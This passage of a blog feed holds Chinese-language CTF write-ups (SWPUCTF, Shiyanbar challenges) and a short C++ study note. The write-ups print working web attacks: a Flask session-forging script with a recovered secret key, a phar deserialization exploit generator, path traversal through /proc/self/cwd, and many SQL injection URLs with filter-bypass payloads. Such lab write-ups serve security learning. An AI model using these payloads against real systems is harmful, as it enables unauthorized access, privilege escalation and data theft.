../../</p><p>os.path.join()。 注：第一个绝对路径之前的参数将被忽略</p><p>cat /proc/pid/maps 查看进程内存映射</p><p>利用特性构造文件包含读取到web 路径。<br>pwd 当前工作目录<br>cwd 所在的目录的绝对路径.进程当前工作目录的符号链接</p><p>view-source:<a href="http://107.167.188.241/static?file=/proc/self/cwd/app/views.py" target="_blank" rel="noopener">http://107.167.188.241/static?file=/proc/self/cwd/app/views.py</a></p><p>伪造session<br>username修改为admin.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span><span class="params">(object)</span>:</span></span><br><span class="line">    secret_key = <span class="string">'9f516783b42730b7888008dd5c15fe66'</span></span><br><span class="line"></span><br><span class="line">s = SecureCookieSessionInterface().get_signing_serializer(App())</span><br><span class="line">u = s.loads(<span class="string">'.eJwVzDsSwyAMRdG9vNqFCP4Am8kIWRROImYAVxnvPc6tTnW_yPxmE0VydDdB6mkD6a_eynPUlxoSyJVZwqaZY1hJRXj1cwyu7PvDUy6ZluiZBBPOrs34cy9xcK-G6wctLh7_.XB7-2Q.d8W10pqlUI57tZthRyxwUddoIuQ'</span>)</span><br><span class="line">u[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">u[<span class="string">'balance'</span>]=<span class="number">100000000</span></span><br><span class="line">print(s.dumps(u))</span><br></pre></td></tr></table></figure><p>点击admin用burp抓包发现username字段。<br>python的format函数漏洞。通过format将flag读取<br>构造继承链条<br><code>field=__class__.save.__globals__[db].__class__.__init__.__globals__[current_app].before_request.__globals__[g].flag</code></p><p>读取flag;</p><p><img src="https://i.imgur.com/udAy0yV.png" alt=""></p><h1 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h1><p>网站有两个功能，一个upload_file.php上传，一个查看文件file.php。<br>通过file.php查看所有源码</p><p>查看提示flag在f1ag.php中。<br>于是学习了一波phar反序列化漏洞。<br>具体参考<a href="http://n3k0sec.top/2018/12/18/swpuctf-wp/#SimplePHP" target="_blank" rel="noopener">http://n3k0sec.top/2018/12/18/swpuctf-wp/#SimplePHP</a><br>生成phar文件</p><p>看别人脚本exp构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $test;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $source;</span><br><span class="line"><span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> $params = <span class="keyword">array</span>(<span class="string">'source'</span> =&gt; <span class="string">'var/www/html/f1ag.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"c1e4r.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"c1e4r.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    $p1 = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$p2 = <span class="keyword">new</span> Show();</span><br><span class="line">$p2-&gt;str = <span class="keyword">array</span>(<span class="string">'str'</span>=&gt;<span class="keyword">new</span> Test());</span><br><span class="line">$p1-&gt;str = $p2;</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($p1); </span><br><span class="line">var_dump($phar-&gt;getMetadata());</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"c1e4r"</span>); </span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>形成pop链，上传之后在function中看到$filename = md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”;,进行md5加密访问<code>file.php?file=phar://upload/文件名</code>,base64解密得到flag;</p><p>Remote_addr 表示代理ip地址。</p><hr><p>#Misc </p><h1 id="唯有低头，才能出头"><a href="#唯有低头，才能出头" class="headerlink" title="唯有低头，才能出头"></a>唯有低头，才能出头</h1><p><code>99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</code></p><p>99-l 9-o 以此类推</p><h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>看到一般flag{}   ，Winhex前四位是宽，后四位是高，修改高度，02 ff;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;用优惠码买个X&quot;&gt;&lt;a href=&quot;#用优惠码买个X&quot; class=&quot;headerlink&quot; title=&quot;用优惠码买个X&quot;&gt;&lt;/a&gt;用优惠码买个X&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;单引号里面的双引号中的变量不会解析！ &lt;/li&gt;
&lt;li&gt;string substr (
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>C++ Learn</title>
    <link href="http://yoursite.com/2018/12/11/C++_Learn/"/>
    <id>http://yoursite.com/2018/12/11/C++_Learn/</id>
    <published>2018-12-10T16:00:00.000Z</published>
    <updated>2019-05-19T06:21:33.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="类模板与模板类"><a href="#类模板与模板类" class="headerlink" title="类模板与模板类"></a>类模板与模板类</h1><p>类模板：用户为类定义模式，参数取任意类型。（类型不确定）<br>模板类：类模板实例化产物</p><h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><p>char str[] 一个字符数组,例如‘a’,’b’<br>char <em>str[] 一个数组，类型是char</em><br>char* 指向字符串，是一个字符串数组，可以是”abc””123”</p><h1 id="swap函数"><a href="#swap函数" class="headerlink" title="swap函数"></a>swap函数</h1><pre><code>void swap(int *x, int *y){int temp=*x;*x=*y;*y=temp;}</code></pre><p>或者</p><pre><code>void swap(int&amp; a, int&amp; b){    int swap = a;    a = b;    b = swap;}</code></pre><p>应该交换地址而非传递形参的值进行交换</p><h1 id="double不以科学技术输出"><a href="#double不以科学技术输出" class="headerlink" title="double不以科学技术输出"></a>double不以科学技术输出</h1><p>库<br>#include<iomanip></iomanip></p><p>cout&lt;&lt;fixed&lt;&lt;setprecision()&lt;&lt;ans&lt;&lt;endl;</p><p>round()四舍五入函数。</p><p>#define PI 定义宏，简单的文本替换。</p><p><code>getchar()   //接受一個字符，需包含“#include&lt;string&gt;”ch=getchar();</code></p><p><code>gets()        // 接受一個字符串，可以接收空格并輸出，需包含“#include&lt;string&gt;”gets(m);</code></p><p>getline()     // 接受一個字符串，可以接收空格并输出<br>getline(cin,str);</p><p>cin.getline()   // 接受一個字符串，可以接收空格并输出<br>cin.getline(m,5);   </p><p> cin.get(字符变量名)可以用来接收字符        </p><h1 id="sort函数"><a href="#sort函数" class="headerlink" title="sort函数"></a>sort函数</h1><p>（数组起始地址，数组结束地址，排序方法默认从小到大）</p><h1 id="结构体学习"><a href="#结构体学习" class="headerlink" title="结构体学习"></a>结构体学习</h1><p>在声明类型的同时定义变量</p><pre><code>#include&lt;iostream&gt;using namespace std;int main(){    struct Student{      //声明一个结构体类型Student         int num;         //声明一个整形变量num         char name[20];   //声明一个字符型数组name         char sex;        //声明一个字符型变量sex         int age;         //声明一个整形变量age         float score;     //声明一个单精度型变量         char addr[30];   //声明一个字符型数组addr    }student1,student2;//声明变量student1和student2   cout&lt;&lt;sizeof(Student)&lt;&lt;endl;   cout&lt;&lt;sizeof(student1)&lt;&lt;endl;   cout&lt;&lt;sizeof(student2)&lt;&lt;endl;        return 0;}</code></pre><p>创建动态struct数组<br>Student * array=new Student[n];</p><ul><li><code>struct struct name * struct_array=new struct_name[struct_array_len]</code></li><li>输入struct数组元素值<br><code>scanf(&quot;%d&quot;,&amp;struct_array[i].struct_member)</code></li><li>排序<br><code>sort(struct_array,struct_array+struct_array_len,compare)</code></li><li>释放<br><code>delete []struct_array</code></li></ul><h1 id="读取大数据"><a href="#读取大数据" class="headerlink" title="读取大数据"></a>读取大数据</h1><p>std::ios::sync_with_stdio(false)可取消cin和stdcin同步；节省开销<br>可以将cin和scanf的效率相匹敌；</p><h1 id="memset"><a href="#memset" class="headerlink" title="memset"></a>memset</h1><p>void <em>memset(void </em>s, int ch, size_t n);<br>将s所指向的某一块内存中的前n个字节的内容全部设置为ch指定的ASCII值。这个函数通常为新申请的内存做初始化工作。其返回值为s。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;类模板与模板类&quot;&gt;&lt;a href=&quot;#类模板与模板类&quot; class=&quot;headerlink&quot; title=&quot;类模板与模板类&quot;&gt;&lt;/a&gt;类模板与模板类&lt;/h1&gt;&lt;p&gt;类模板：用户为类定义模式，参数取任意类型。（类型不确定）&lt;br&gt;模板类：类模板实例化产物&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="code" scheme="http://yoursite.com/categories/code/"/>
    
    
      <category term="program" scheme="http://yoursite.com/tags/program/"/>
    
  </entry>
  
  <entry>
    <title>实验吧Writeup</title>
    <link href="http://yoursite.com/2018/12/04/%E5%AE%9E%E9%AA%8C%E5%90%A7/"/>
    <id>http://yoursite.com/2018/12/04/实验吧/</id>
    <published>2018-12-03T16:00:00.000Z</published>
    <updated>2018-12-23T04:29:24.079Z</updated>
    
    <content type="html"><![CDATA[<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>MYSQL #后面内容会被注释<br>version()获取数据库版本<br>@@version_compile_os获取操作系统</p><h1 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h1><p>查看源码<br><img src="https://i.imgur.com/appELmb.png" alt=""><br>md5弱类型构造user:s878926199a md5加密为0<br><img src="https://i.imgur.com/hzta7UG.png" alt=""><br>构造serialize，bool类型为True<br>根据<img src="https://i.imgur.com/DlXwh4m.png" alt=""><br>构造代码：</p><pre><code>&lt;?php$test1=array(&quot;user&quot;=&gt;true,&quot;pass&quot;=&gt;true);echo var_dump($test1);echo var_dump(serialize($test1));?&gt;</code></pre><p>pass修改拿flag</p><h1 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h1><p>key: vim编辑时产生隐藏文件swp即后缀名为.swp，文件退出自动删除。<br>隐藏文件前面加.</p><p>查看源码发现关键信息，Vim编辑和admin邮箱地址</p><ol><li><p>输入1弹出<br><img src="https://i.imgur.com/fLRKRmQ.png" alt=""><br>访问<code>http://ctf5.shiyanbar.com/10/upload/step2.php</code>发现返回step1。                  </p></li><li><p>Burp截包发现跳转到submit.php验证<br>访问<code>http://ctf5.shiyanbar.com/10/upload/submit.php</code>发现不是管理员，由此想到隐藏文件<code>.submit.php.swp</code>访问之后，发现token验证。<br><img src="https://i.imgur.com/UJu82yd.png" alt=""></p></li><li><p>利用0e00000000绕过<br><img src="https://i.imgur.com/pAotWoT.png" alt=""></p><pre><code>payload:http://ctf5.shiyanbar.com/10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0e00000000</code></pre><h1 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h1><p>注意Python3中的bytes-str的转换<br>Burp抓包发现Flag，每次提交Flag变化，脚本提交。</p></li></ol><p>脚本如下</p><pre><code>import requestsimport base64url=&quot;http://ctf5.shiyanbar.com/web/10/10.php&quot;r=requests.get(url)if &apos;FLAG&apos;in r.headers:        x=bytes(r.headers[&apos;FLAG&apos;],&quot;utf-8&quot;)        key=base64.b64decode(x).decode(&apos;utf-8&apos;).split(&apos;:&apos;)[1]        data={&apos;key&apos;:key}        print(requests.post(url,data=data).text)</code></pre><h1 id="简单的注入"><a href="#简单的注入" class="headerlink" title="简单的注入"></a>简单的注入</h1><p>空格+关键词绕过</p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  schema.name  fromfrom  infromation_schema.schemata  wherewhere &#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  &#39;1&#39;=&#39;1</code></p><p>coulumn_name被绕过，因此修改绕过字段</p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_scheminformation_schema.columnsa.columns  wherewhere  table_name=&#39;flag</code></p><p>找到字段flag查找<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;  unionunion  selectselect  flag  fromfrom  flag  wherewhere  &#39;1&#39;=&#39;1</code></p><h1 id="简单的注入2"><a href="#简单的注入2" class="headerlink" title="简单的注入2"></a>简单的注入2</h1><p>与1不同的是并非关键字和空格，过滤掉所有空格，没有回显。</p><p>爆库 表 和列换注释绕过空格<br><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/&#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/423/web/?id=1&#39;/**/union/**/select/**/columcolumn_namen_name/**/from/**/information_scheminformation_schema.columnsa.columns/**/where/**/&#39;1&#39;=&#39;1</code></p><p><code>http://ctf5.shiyanbar.com/web/index_2.php?id=1&#39;/**/union/**/select/**/flag/**/from/**/flag/**/where/**/&#39;1&#39;=&#39;1</code></p><h1 id="简单的注入3"><a href="#简单的注入3" class="headerlink" title="简单的注入3"></a>简单的注入3</h1><h1 id="NSCTF"><a href="#NSCTF" class="headerlink" title="NSCTF"></a>NSCTF</h1><p>很简单的一个密码变换。一个逆序过程。附代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$_=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a=strrev(base64_decode((strrev((str_rot13($_))))));</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)&#123;</span><br><span class="line">$b=substr($a,$i,<span class="number">1</span>);</span><br><span class="line">$c=ord($b)<span class="number">-1</span>;</span><br><span class="line">$d=chr($c);</span><br><span class="line">$e=$e.$d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$e"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="你真的会PHP吗"><a href="#你真的会PHP吗" class="headerlink" title="你真的会PHP吗"></a>你真的会PHP吗</h1><p>抓包看到 6c525af4059b4fe7d8c33a.txt,访问之后看到源码。<br>分析源码要满足条件</p><ol><li>number不是数字</li><li>$req[‘number’]==strval(intval($req[‘number’]</li><li>$value1 = intval($req[“number”]);<br>$value2 = intval(strrev($req[“number”]));要相等<br>$number不是回文数  </li></ol><p>操作系统，32位有符号数int范围-2147483648~2147483647，<br>构造<code>2147483647%00</code>绕过</p><p>tips:strval会忽略掉%00与%20 </p><h1 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h1><p>urldecode让URL解码后，等于hackerDj,因为提交的时候浏览器会自动解码一次，PHP处理时解码一次，故解码两次。因此对hackerDJ进行URL编码两次构造<br><code>http://ctf5.shiyanbar.com/DUTCTF/index.php?id=%2568ackerDJ</code></p><p>flag;</p><h1 id="这看起来有点简单"><a href="#这看起来有点简单" class="headerlink" title="这看起来有点简单"></a>这看起来有点简单</h1><p>常规注入。未加任何<br><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,schema_name from information_schema.schemata</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,table_name from information_schema.tables where table_schema=’my_db’;</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,column_name from information_schema.columns where table_name=’thiskey’</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,column_name from information_schema.columns where table_name=’thiskey’</p><p><a href="http://ctf5.shiyanbar.com/8/index.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/8/index.php?id=1</a> union select 1,k0y from thiskey</p><h1 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h1><p>抓包构造 X-Forwarder-for:1.1.1.1<br>客户端最原始的IP地址</p><h1 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h1><p>1.Tips很明确，修改头部，条件检测 .net framework 9.9,官方文档说检测到他会在头部UA中加入 <code>.NET CLR 9.9</code><br>2.伪造IE浏览器加入  <code>compatible; MSIE 9.0；</code>信息</p><h1 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h1><p>sleep注入   wait….</p><h1 id="Guess-Next-Session"><a href="#Guess-Next-Session" class="headerlink" title="Guess Next Session"></a>Guess Next Session</h1><p>查看代码分析，根据随机生成器生成数字，要使Session的password跟输入的password相等。删除COOKIE 中  PHPSESSID,删除password值。<br>null=null,通过验证。  </p><h1 id="False"><a href="#False" class="headerlink" title="False"></a>False</h1><p>md5和sha1无法处理数组，处理结果都为null,构造<br><code>http://ctf5.shiyanbar.com/web/false.php?name[]=1&amp;password[]=2</code></p><h1 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h1><p>抓包，将showsource改为1；发现隐藏表单字段。提交正确PIN码即可。</p><h1 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h1><p>ereg函数存在截断漏洞， %00截断，ereg不会解析后面的字符。<br>利用科学记数法绕过数字大小。<br><code>http://ctf5.shiyanbar.com/web/more.php?password=1e8%00*-*</code></p><h1 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h1><p>关键点<br>if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) </p><p>密码值经过md5加密后相等，构造查询语句使得$sql查询语句返回md5(1)的值，构造<br>`user=1’ union select ‘c4ca4238a0b923820dcc509a6f75849b’</p><p><code>1</code></p><h1 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h1><p>主要考察SQL基本功；看到代码分析。</p><p>过滤了关键字$filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“;</p><p>不能使用这些关键字查询。</p><p>但是有一个mysql_num_rows($query) == 1判断。</p><p>使用 limit 1 offset 0进行限制绕过。</p><p>看了大佬的writeup知道 with rollup 可进行分组统计数据基础上再进行相同的统计。<br>使用 <code>1&#39; or 1=1 group by pwd with rollup limit 1 offset 2#</code></p><p>恰好使 pwd=null, 然后  if(null=null)绕过 。</p><h1 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h1><p>伪静态技术<br>构造<code>http://ctf5.shiyanbar.com/indirection/index.php/user/index.php</code>会把user解析为参数名，把后面的index.php解析为参数值。</p><p>#</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;sql注入&quot;&gt;&lt;a href=&quot;#sql注入&quot; class=&quot;headerlink&quot; title=&quot;sql注入&quot;&gt;&lt;/a&gt;sql注入&lt;/h1&gt;&lt;p&gt;MYSQL #后面内容会被注释&lt;br&gt;version()获取数据库版本&lt;br&gt;@@version_compile_o
      
    
    </summary>
    
    
  </entry>
  
</feed>
